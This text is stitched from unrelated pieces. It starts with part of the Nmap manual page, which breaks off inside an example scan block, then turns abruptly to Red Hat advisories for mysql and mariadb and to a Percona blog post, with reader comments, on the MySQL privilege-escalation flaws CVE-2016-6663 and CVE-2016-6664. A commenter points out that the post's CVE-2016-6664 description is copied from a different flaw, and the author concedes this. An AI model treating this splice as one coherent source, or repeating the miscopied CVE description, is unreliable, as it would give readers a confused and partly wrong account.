helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

## Name

nmap — Network exploration tool and security / port scanner

## Synopsis

`nmap` [
*`<Scan Type>`*
...] [
*`<Options>`*
] {
*`<target specification>`*
}

## Description

| [Note] | Note |
| --- | --- |
| This document describes the very latest version of Nmap available from [`https://nmap.org/download.html`](https://nmap.org/download.html) or [`https://nmap.org/dist/?C=M&O=D`](https://nmap.org/dist/?C=M&O=D). Please ensure you are using the latest version before reporting that a feature doesn't work as described. |

Nmap (“Network Mapper”) is an open source tool for network
exploration and security auditing. It was designed to rapidly
scan large networks, although it works fine against single
hosts. Nmap uses raw IP packets in novel ways to determine what
hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other
characteristics. While Nmap is commonly used for security audits,
many systems and network administrators find it useful for routine
tasks such as network inventory, managing service upgrade
schedules, and monitoring host or service uptime.

The output from Nmap is a list of scanned targets, with
supplemental information on each depending on the options
used. Key among that information is the “interesting ports
table”.
That table lists the port number and protocol,
service name, and state. The state is either
`open`, `filtered`,
`closed`, or `unfiltered`.
`Open`
means that an application on the target machine is listening for
connections/packets on that port.
`Filtered`
means that a firewall, filter, or other network
obstacle is blocking the port so that Nmap cannot tell whether it is
`open` or `closed`.
`Closed`
ports have no application listening on them,
though they could open up at any time.
Ports are classified as
`unfiltered`
when they are
responsive to Nmap's probes, but Nmap cannot determine whether they are
open or closed.
Nmap reports the state combinations
`open|filtered`
and `closed|filtered`
when it cannot determine which
of the two states describe a port. The port table may also
include software version details when version detection has been
requested. When an IP protocol scan is requested
(`-sO`), Nmap provides information on supported IP
protocols rather than listening ports.

In addition to the interesting ports table, Nmap can provide
further information on targets, including reverse DNS names,
operating system guesses, device types, and MAC addresses.

A typical Nmap scan is shown in [Example 15.1](man.html#man-ex-repscan "Example 15.1. A representative Nmap scan"). The only Nmap arguments used in
this example are `-A`, to enable OS and version
detection, script scanning, and traceroute; `-T4` for
faster execution; and then the hostname.

Example 15.1. A representative Nmap scan
```
# nmap -A -T4 scanme.nmap.org

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2017%3A0184)

## Topic

An update for mysql is now available for Red Hat Enterprise Linux 6.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

MySQL is a multi-user, multi-threaded SQL database server. It consists of the MySQL server daemon (mysqld) and many client programs and libraries.

Security Fix(es):

* It was discovered that the MySQL logging functionality allowed writing to MySQL configuration files. An administrative database user, or a database user with FILE privileges, could possibly use this flaw to run arbitrary commands with root privileges on the system running the database server. (CVE-2016-6662)
* A race condition was found in the way MySQL performed MyISAM engine table repair. A database user with shell access to the server running mysqld could use this flaw to change permissions of arbitrary files writable by the mysql system user. (CVE-2016-6663, CVE-2016-5616)

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

After installing this update, the MySQL server daemon (mysqld) will be restarted automatically.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2016%3A2595)

## Topic

An update for mariadb is now available for Red Hat Enterprise Linux 7.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

MariaDB is a multi-user, multi-threaded SQL database server that is binary compatible with MySQL.

The following packages have been upgraded to a newer upstream version: mariadb (5.5.52). (BZ#1304516, BZ#1377974)

Security Fix(es):

* It was discovered that the MariaDB logging functionality allowed writing to MariaDB configuration files. An administrative database user, or a database user with FILE privileges, could possibly use this flaw to run arbitrary commands with root privileges on the system running the database server. (CVE-2016-6662)
* A race condition was found in the way MariaDB performed MyISAM engine table repair. A database user with shell access to the server running mysqld could use this flaw to change permissions of arbitrary files writable by the mysql system user. (CVE-2016-6663)
* This update fixes several vulnerabilities in the MariaDB database server. Information about these flaws can be found on the Oracle Critical Patch Update Advisory page, listed in the References section. (CVE-2016-3492, CVE-2016-5612, CVE-2016-5616, CVE-2016-5624, CVE-2016-5626, CVE-2016-5629, CVE-2016-8283)

Additional Changes:

For detailed information on changes in this release, see the Red Hat Enterprise Linux 7.3 Release Notes linked from the References section.

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

After installing this update, the MariaDB server daemon (mysqld) will be restarted automatically.

# Percona responds to CVE-2016-6663 and CVE-2016-6664

November 2, 2016

[David Busby](https://www.percona.com/blog/author/david-busby)

[![CVE-2016-6663 and CVE-2016-6664](data:image/svg+xml...)](https://www.percona.com/blog/wp-content/uploads/2016/11/CVE-2016-6663-and-CVE-2016-6664.jpg)Percona has addressed CVE-2016-6663 and CVE-2016-6664 in releases of Percona Server for MySQL and Percona XtraDB Cluster.

Percona is happy to announce that the following vulnerabilities are fixed in current releases of Percona Server for MySQL and Percona XtraDB Cluster:

* [CVE-2016-6663](https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html): allows a local system user with access to the affected database in the context of a low-privileged account (CREATE/INSERT/SELECT grants) to escalate their privileges and execute arbitrary code as the database system user (typically “mysql”).
* [CVE-2016-6664](https://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html): can let attackers who have gained access to mysql system user to further escalate their privileges to root user allowing them to fully compromise the system.

Users should **upgrade to their relevant incremental release**.

**Percona Server**

* [5.5.51-38.2](https://www.percona.com/doc/percona-server/5.5/release-notes/Percona-Server-5.5.51-38.1.html#module-5.5.51-38.1)
* [5.6.32-78-1](https://www.percona.com/doc/percona-server/5.6/release-notes/Percona-Server-5.6.32-78.1.html)
* [5.7.14-8](https://www.percona.com/doc/percona-server/5.7/release-notes/Percona-Server-5.7.14-8.html#module-5.7.14-8)

**Percona XtraDB Cluster**

* [5.5.41-37.0](https://www.percona.com/downloads/Percona-XtraDB-Cluster/LATEST/source/)
* [5.6.32-25.17](https://www.percona.com/doc/percona-xtradb-cluster/5.6/release-notes/Percona-XtraDB-Cluster-5.6.32-25.17.html#module-5.6.32-25.17)
* [5.7.14-26.17](https://www.percona.com/downloads/Percona-XtraDB-Cluster-57/LATEST/)

Users should update as soon as is practical to ensure protection from these vulnerabilities.

Percona would like to thank Dawid Golunski ([https://legalhackers.com](https://legalhackers.com/)) for disclosing this issue.

Your description for -6664 is totally wrong, you apparently, copy-pasted a description of a different vulnerability there

This does look incorrect, I will advise marketing of the error.

In fact, -6663 looks wrong too

CVE-2016-6663 description was taken from the advisory linked

Indeed, you are right. It is correct, strictly speaking. It just doesn’t mention the race condition, or REPAIR, or OPTIMIZE, or MyISAM, only CREATE/INSERT/SELECT, which aren’t used in this vulnerability at all. So it appears to look incorrectly and that was confusing. Sorry.

Just for clarity, the listed Percona Server/XtraDB Cluster versions are in fact patched, and not the most recent unpatched versions?

The versions noted in the post contain the fixes, of course I would recommend however that you use the latest version to ensure you have all of the most recent fixes.

 0  ![CasBuac7Kee](data:image/svg+xml...) CasBuac7Kee    8 years ago

Some of us still use the old 5.1 series of Percona Server. Any chance to backport these security fixes to the old 5.1 series?

I will ask our development team, however given 5.1 went EOL in 2013 I would strongly recommend you look to upgrade as soon as possible!

Thank you for your help! Unfortunately upgrade is not always an option, and not always my decision (due the tight software dependency).

Please note MySQL 5.1 is still supported and will supported until 2020 on RHEL6 (and their derivates CentOS6, Scientific Linux 6). But the Percona Server 5.1 is lot more tuned and has more administrative features for production workload, than the original version. So I would prefer to stay on the Percona Server 5.1 instead of replacing it with the untuned distro version. As Redhat will eventually release the fixes (as source code), your security team could also use it as a patch source. I would be really helpful if the security team at least integrate the security patches released by Redhat to the Percona Server 5.1 series, and rebuild the packages.

Thanks for your help!

I’ve had a response from our developers and that is that Percona Server 5.1 will move to “Customized support”, which essential is EOL unless someone pays for a release and backports. As such our recommendation is to upgrade to at least 5.5 as soon as possible.

The CVE-2016-6663 could also successfully executed and gain a shell with mysql user on Percona-Server-server-51-5.1.73-rel14.12.624.rhel6.x86\_64 ….

There seems to be no change in the percona-xtradb-cluster-5.5 between version 5.5.41-25.11.1 and 5.5.41-37.0. Are we sure this has the right fix? If so that seems to suggest the fix was in place back in Sept.

I meant between 5.5.41-25.12-855 and 5.5.41-37.0
